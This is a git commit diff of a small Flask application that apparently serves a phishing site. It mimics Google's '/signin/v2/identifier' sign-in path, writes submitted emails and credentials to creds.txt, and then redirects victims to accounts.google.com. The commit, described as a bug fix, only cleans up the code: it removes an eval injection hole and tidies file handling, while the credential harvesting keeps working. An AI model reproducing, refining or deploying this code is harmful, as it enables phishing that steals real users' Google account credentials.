9e8fa19e4b183e63a9e7f8216857896deb954843
moch zuhrul umam <zuhrulumam969@gmail.com>
2025-06-08 15:05:57 +0700

    update fitur xyz / perbaikan bug

--- app.py
+++ app.py
@@ -4,33 +4,36 @@ app = Flask(__name__)
 
 @app.route("/")
 def page1():
-   return render_template("page1.html")
+    return render_template("page1.html")
 
 @app.route("/signin/v2/identifier")
 def page2():
-   return render_template("page2.html")
+    return render_template("page2.html")
 
-@app.route("/logger/<func>", methods=["GET","POST"])
+@app.route("/logger/<int:func>", methods=["GET", "POST"])
 def logger(func):
-  if request.method == "POST":
-    data = request.form["emailid"]
-    f = open("creds.txt", "a")
-    f.write(data)
-    f.write("\n")
-    f.close()
-    if eval(func) == 1:
-      return redirect("/signin/v2/identifier")
-    if eval(func) == 2:
-      return redirect("https://accounts.google.com")
+    if request.method == "POST":
+        data = request.form.get("emailid")
+        if data:
+            with open("creds.txt", "a") as f:
+                f.write(data + "\n")
 
-@app.route("/logger/<data>/<func>", methods=["GET", "POST"])
+        if func == 1:
+            return redirect("/signin/v2/identifier")
+        elif func == 2:
+            return redirect("https://accounts.google.com")
+
+    return "Invalid request", 400
+
+@app.route("/logger/<data>/<int:func>", methods=["GET", "POST"])
 def logger1(data, func):
-    f = open("creds.txt", "a")
-    f.write(data)
-    f.write("\n")
-    f.close()
-    if eval(func) == 1:
-      return redirect("/signin/v2/identifier")
-    if eval(func) == 2:
-      return redirect("https://accounts.google.com")
+    if data:
+        with open("creds.txt", "a") as f:
+            f.write(data + "\n")
 
+    if func == 1:
+        return redirect("/signin/v2/identifier")
+    elif func == 2:
+        return redirect("https://accounts.google.com")
+
+    return "Invalid request", 400
